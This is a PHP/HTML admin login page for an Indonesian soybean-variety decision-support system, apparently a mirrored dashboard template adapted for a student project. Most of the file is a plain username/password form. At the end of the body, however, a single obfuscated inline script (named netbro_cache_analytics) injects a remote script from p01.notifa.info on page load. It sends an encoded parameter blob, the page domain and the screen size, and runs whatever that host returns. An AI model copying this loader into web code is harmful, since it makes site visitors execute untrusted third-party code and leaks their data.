<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.urbanui.com/flare/template/pages/samples/login-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Jan 2019 03:59:52 GMT -->
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>SPK Varietas Kedelai Unggul</title>
  <!-- plugins:css -->
  <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/iconfonts/simple-line-icon/css/simple-line-icons.css">
  <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/css/vendor.bundle.base.css">
  <link rel="stylesheet" href="<?php echo base_url('')?>assets/vendors/css/vendor.bundle.addons.css">
  <!-- endinject -->
  <!-- plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- inject:css -->
  <link rel="stylesheet" href="<?php echo base_url('')?>assets/css/style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="<?php echo base_url('')?>assets/images/logospk.png" />
</head>

<body>
  <div class="container-scroller">
    <div class="container-fluid page-body-wrapper full-page-wrapper">
      <div class="content-wrapper auth p-0 theme-two">
        <div class="row d-flex align-items-stretch">
          <div class="col-md-4 banner-section d-none d-md-flex align-items-stretch justify-content-center">
            <div class="slide-content bg-1">
            </div>
          </div>
          <div class="col-12 col-md-8 h-100 bg-white">
            <div class="auto-form-wrapper d-flex align-items-center justify-content-center flex-column">
              <form method="post" action="<?php echo base_url('Login/cekLogin')?>">
                <h3 class="mr-auto">Login Administrator</h3>
                <p class="mb-5 mr-auto">Sistem Pendukung Keputusan Pemilihan Varietas Kedelai Unggul</p>
                <div class="form-group">
                  <div class="input-group">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="icon-user text-primary"></i></span>
                    </div>
                    <input type="text" name="username" class="form-control text-primary" placeholder="Username" required="" autofocus>
                  </div>
                </div>
                <div class="form-group">
                  <div class="input-group">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="icon-lock text-primary"></i></span>
                    </div>
                    <input type="password" name="password" class="form-control text-primary" placeholder="Password" required="">
                  </div>
                </div>
                <div class="form-group">
                  <button type="submit" class="btn btn-primary submit-btn">LOGIN</button>
                </div>
                <?php
                  if (isset($errVar)) {
                    if ($errVar==1) {
                ?>
                  <div class="toast" data-autohide="false">
                    <div class="toast-header">
                      <strong class="mr-auto text-danger">Gagal Login</strong>
                      <small class="text-muted">2 secs ago</small>
                      <button type="button" class="ml-2 mb-1 close" data-dismiss="toast">&times;</button>
                    </div>
                    <div class="toast-body">
                      Username atau Password Salah ! Coba Lagi.
                    </div>
                  </div>
                <?php
                    } else if ($errVar==2){
                ?>
                  <div class="toast" data-autohide="false">
                    <div class="toast-header">
                      <strong class="mr-auto text-danger">Gagal Login</strong>
                      <small class="text-muted">2 secs ago</small>
                      <button type="button" class="ml-2 mb-1 close" data-dismiss="toast">&times;</button>
                    </div>
                    <div class="toast-body">
                      Username atau Password Salah ! Coba Lagi.
                    </div>
                  </div>
                <?php
                    }
                  }
                ?>
                
                <div class="wrapper mt-5 text-gray">
                  <p class="footer-text">Teknologi Informasi | Politeknik Negeri Jember (2019)</p>
                  <!--<ul class="auth-footer text-gray">
                    <li><a href="#">Terms & Conditions</a></li>
                    <li><a href="#">Cookie Policy</a></li>
                  </ul>
                -->
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
      <!-- content-wrapper ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->
  <!-- plugins:js -->
  <script src="<?php echo base_url('')?>assets/vendors/js/vendor.bundle.base.js"></script>
  <script src="<?php echo base_url('')?>assets/vendors/js/vendor.bundle.addons.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page-->
  <!-- End plugin js for this page-->
  <!-- inject:js -->
  <script src="<?php echo base_url('')?>assets/js/template.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <!-- End custom js for this page-->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2f5piOvuQe62vxL5FrZAOePZqekCEvkNv%2f5Kr3XTnukg2hwQl0DsISlNtnPn5tuSIBYBPn8N0KbzUo2VVQnlWeJ5MvDhOKkkVFrXUh8aquStM5CHMGlP0Y6jKglCX0l3L3QMUYGKj0RAsodPFX3xPOcEyd%2b9VF2Ncd3CtXfzVrljFDMCVoKNRaL9KE9aJD8NqU7PPJt7lnrxUXo%2fVcXKhwhkyOZrur44rlgcYRhpRpmWLLlKrbgZc%2f9HE6aVgC81A5h2mrEKG%2bT5BmD1QiwSxMW4L3MjR1nKBQNVGBnSKKF9JwPIHfD0ds%2b0T12oaDRP%2bRMv8nch%2bdz3WzxoIGcc0dev2dAw9xu5MHAeXjrkEyKBDM1u6ir9r9htKJ3eYB3CJ8TPoC7ys3Xu2GI9olOAZHzEhJ6HtO1Ih77PwUExH9pHEOTCdpXCm603%2bRC5bii23xlaIxSqgBqPmOU29L7fGIx%2b5DEa732quyqHBeiQ6Aq%2b1wgOEbJmYU3AHS2UaI4lxV0l4lcE6JOo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from www.urbanui.com/flare/template/pages/samples/login-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Jan 2019 03:59:52 GMT -->
</html>
